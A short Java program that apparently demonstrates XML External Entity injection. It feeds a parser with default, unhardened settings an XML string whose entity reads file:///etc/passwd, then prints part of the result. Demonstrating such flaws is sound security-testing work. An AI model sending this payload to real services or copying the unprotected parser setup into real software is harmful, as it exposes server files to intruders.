import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import org.w3c.dom.Document;
import java.io.ByteArrayInputStream;

public class XXETestMac {
    public static void main(String[] args) {
        String xmlData = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                         "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>" +
                         "<foo>&xxe;</foo>";

        try {
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
            DocumentBuilder builder = factory.newDocumentBuilder();
            Document document = builder.parse(new ByteArrayInputStream(xmlData.getBytes()));
            document.getDocumentElement().normalize();
            String content = document.getDocumentElement().getTextContent();
            // Truncate content to display just a snippet for presentation purposes
            if(content.length() > 100) {
                content = content.substring(0, 100) + "...";
            }
            System.out.println(content);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
